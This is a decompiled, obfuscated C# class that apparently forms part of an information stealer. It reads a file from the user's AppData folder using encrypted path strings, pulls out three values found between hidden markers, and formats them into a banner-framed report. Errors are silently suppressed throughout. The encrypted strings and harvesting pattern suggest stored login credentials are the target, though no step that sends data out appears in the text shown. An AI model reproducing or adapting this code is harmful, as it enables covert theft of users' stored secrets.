using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal sealed class Class7
{
	public class Class8
	{
		[DebuggerNonUserCode]
		public Class8()
		{
		}

		public void method_0()
		{
			try
			{
				string string_ = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Interaction.Environ("Username"), Class9.smethod_0("bLK9eJ+eq8PLHw==", "False"), 1, -1, (CompareMethod)0) + Class9.smethod_0("jZDQzJR/n7OzwJWty8PCja/GzLaas4XCyZ+wxdEZ", "False");
				string string_2 = method_1(string_);
				string text = method_2(string_2, Class9.smethod_0("maHT3tGxtgo=", "False"), Class9.smethod_0("W6Kzs6tVLw==", "False"));
				string text2 = method_2(string_2, Class9.smethod_0("bqekuKZ6oaSDMQ==", "False"), "\r\n");
				string text3 = method_2(string_2, Class9.smethod_0("kLzZ4NavzcqqCg==", "False"), "\r\n");
				string text4 = (string_0 = ((Operators.CompareString(text3, "", false) == 0) ? (Class9.smethod_0("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + "\r\n\r\n" + Class9.smethod_0("arq6gImUtGyAZXSwbKWqibC+t7hGh7vIs4oh", "False") + "\r\n\r\n" + Class9.smethod_0("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False")) : (Class9.smethod_0("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + "\r\n\r\n" + Class9.smethod_0("fb/O1sdvcBM=", "False") + text + "\r\n" + Class9.smethod_0("d7CtwXtCJQ==", "False") + text2 + "\r\n" + Class9.smethod_0("g8W9mnIT", "False") + text3 + "\r\n\r\n" + Class9.smethod_0("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False"))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
			}
		}

		public string method_1(string string_0)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(string_0);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string method_2(string string_0, string string_1, string string_2)
		{
			string result = default(string);
			try
			{
				string[] array = Strings.Split(string_0, string_1, -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[1], string_2, -1, (CompareMethod)0);
				result = array2[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
